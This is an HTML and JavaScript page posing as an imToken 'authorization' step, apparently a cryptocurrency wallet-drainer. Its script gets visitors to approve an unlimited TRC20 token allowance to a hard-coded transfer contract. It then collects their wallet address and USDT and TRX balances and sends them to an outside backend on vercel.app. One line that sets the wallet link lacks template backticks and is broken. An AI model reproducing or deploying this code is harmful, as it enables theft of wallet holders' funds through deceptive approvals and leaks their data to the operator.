<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>imToken授权</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: sans-serif; background: #f5f5f5; padding: 20px; }
    /* 通用提示页 */
    .tip-container { max-width: 500px; margin: 50px auto; background: white; padding: 30px; border-radius: 12px; }
    .tip-title { font-size: 20px; color: #2c3e50; margin-bottom: 20px; text-align: center; }
    .tip-desc { font-size: 14px; color: #666; line-height: 1.6; margin-bottom: 30px; }
    .btn { width: 100%; padding: 15px; font-size: 16px; border: none; border-radius: 8px; margin-bottom: 15px; cursor: pointer; }
    .btn.imtoken { background: #007AFF; color: white; }
    .btn.copy { background: #f5f5f5; color: #333; }
    /* 授权页 */
    .auth-page { display: none; max-width: 500px; margin: 0 auto; }
    .auth-title { text-align: center; font-size: 22px; margin: 30px 0; }
    .auth-btn { width: 100%; padding: 15px; background: #409EFF; color: white; border: none; border-radius: 8px; font-size: 16px; margin-bottom: 15px; }
    .auth-info { text-align: center; margin: 20px 0; color: #333; }
    /* 授权记录区域 */
    .record-area { margin-top: 30px; background: white; padding: 20px; border-radius: 8px; }
    .record-title { font-size: 16px; color: #2c3e50; margin-bottom: 15px; }
    .record-item { padding: 12px 0; border-bottom: 1px solid #eee; font-size: 14px; color: #333; }
    .record-item:last-child { border-bottom: none; }
    .record-item strong { color: #2c3e50; }
    .record-empty { text-align: center; color: #666; font-size: 14px; padding: 10px 0; }
  </style>
</head>
<body>
  <!-- 通用提示页 -->
  <div class="tip-container" id="tipPage">
    <h2 class="tip-title">请用imToken完成授权</h2>
    <p class="tip-desc">
      1. 点击“打开imToken”按钮，唤起钱包<br>
      2. 若唤起失败，复制链接后打开imToken→浏览，粘贴链接访问
    </p>
    <a href="" id="imtokenLink" class="btn imtoken">打开imToken</a>
    <button class="btn copy" id="copyBtn">复制授权链接</button>
  </div>

  <!-- 授权页（含记录展示） -->
  <div class="auth-page" id="authPage">
    <h1 class="auth-title">TRC20一键无限授权</h1>
    <button class="auth-btn" id="approveBtn">一键授权（无限额度）</button>
    <div class="auth-info" id="authInfo">已连接钱包，点击按钮授权</div>

    <!-- 授权记录展示 -->
    <div class="record-area">
      <h3 class="record-title">授权记录</h3>
      <div id="recordList" class="record-empty">暂无授权记录</div>
    </div>
  </div>

  <script src="https://unpkg.com/tronweb@4.4.2/dist/TronWeb.min.js"></script>
  <script>
    // ========== 你的后端接口地址（必须和这个一致！） ==========
    const BACKEND_API = "https://tron-notify-backend.vercel.app/api/notify-approval";
    // 其他配置项
    const AUTO_TRANSFER_CONTRACT = "TNAfknJTfkPbgmyfpwg3rJQrd17ZLKEMQa";
    const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const INFINITE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
    const PAGE_URL = window.location.href;
    const RECORD_KEY = "imtoken_auth_records";

    // 初始化imToken唤起链接
    document.getElementById("imtokenLink").href = imtoken://browser?url=${encodeURIComponent(PAGE_URL)};

    // 1. 保存记录到本地
    function saveAuthRecord(record) {
      const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
      const newRecords = existing.filter(item => item.address !== record.address);
      newRecords.push(record);
      localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
      renderAuthRecords();
    }

    // 2. 渲染本地记录
    function renderAuthRecords() {
      const listEl = document.getElementById("recordList");
      const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");

      if (records.length === 0) {
        listEl.innerHTML = "<div class='record-empty'>暂无授权记录</div>";
        return;
      }

      listEl.innerHTML = records.map(item => `
        <div class="record-item">
          <p><strong>地址：</strong>${item.address.slice(0, 8)}...${item.address.slice(-6)}</p>
          <p><strong>USDT余额：</strong>${item.tokenBalance} USDT</p><p><strong>TRX余额：</strong>${item.trxBalance} TRX</p>
          <p><strong>授权类型：</strong>${item.approveType}</p>
          <p><strong>时间：</strong>${item.approveTime}</p>
          <p><strong>交易：</strong><a href="https://tronscan.org/#/transaction/${item.txHash}" target="_blank" style="color:#409EFF;">查看</a></p>
        </div>
      `).join("");
    }

    // 3. 核心：同步记录到你的后端（新增！）
    async function syncToBackend(record) {
      try {
        const response = await fetch(BACKEND_API, {
          method: "POST", // 必须是POST请求
          headers: {
            "Content-Type": "application/json", // 告诉后端是JSON格式
            "Accept": "application/json"
          },
          body: JSON.stringify(record), // 把记录转成后端能识别的JSON
          credentials: "omit" // 解决跨域问题
        });

        if (!response.ok) {
          throw new Error(`后端请求失败：${response.status}`);
        }

        const data = await response.json();
        console.log("后端同步成功：", data);
        return true;
      } catch (error) {
        console.error("后端同步失败：", error);
        alert(`授权成功，但后端同步失败：${error.message}\n请检查后端接口是否正常`);
        return false;
      }
    }

    // 4. 检测imToken环境+授权逻辑
    async function checkimTokenEnv() {
      try {
        if (window.tronWeb && (await window.tronWeb.ready)) {
          const tronWeb = window.tronWeb;
          const userAddr = tronWeb.defaultAddress.base58;
          // 切换到授权页
          document.getElementById("tipPage").style.display = "none";
          document.getElementById("authPage").style.display = "block";
          // 加载时渲染记录
          renderAuthRecords();

          // 授权按钮点击事件
          document.getElementById("approveBtn").onclick = async () => {
            try {
              // 步骤1：调用TRC20授权
              const trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
              const txResult = await trc20Contract.approve(
                AUTO_TRANSFER_CONTRACT,
                INFINITE_AMOUNT
              ).send({
                from: userAddr,
                shouldPollResponse: true // 等待链上确认
              });

              // 步骤2：获取用户余额
              const usdtBalance = (await trc20Contract.balanceOf(userAddr).call()) / 1000000;
              const trxBalance = (await tronWeb.trx.getBalance(userAddr)) / 1000000;

              // 步骤3：组装完整记录
              const authRecord = {
                address: userAddr,
                tokenBalance: usdtBalance.toFixed(2),
                trxBalance: trxBalance.toFixed(2),
                approveType: "无限额度",
                txHash: txResult.transaction.txID,
                approveTime: new Date().toLocaleString()
              };

              // 步骤4：保存到本地 + 同步到后端（关键！）
              saveAuthRecord(authRecord);
              const syncSuccess = await syncToBackend(authRecord);

              // 步骤5：提示用户
              if (syncSuccess) {
                alert(`授权成功！\n交易哈希：${txResult.transaction.txID}\n已同步到后端`);
              }
            } catch (error) {
              alert(`授权失败：${error.message}`);
            }
          };
        }
      } catch (error) {
        console.log("非IMToken环境：", error);
      }
    }

    // 5. 复制链接功能
    document.getElementById("copyBtn").onclick = () => {
      const input = document.createElement("input");
      input.value = PAGE_URL;
      document.body.appendChild(input);
      input.select();
      document.execCommand("copy");
      document.body.removeChild(input);
      alert("链接已复制！打开imToken→浏览→粘贴访问");
    };

    // 页面加载后执行
    window.onload = checkimTokenEnv;
  </script>
</body>
</html>
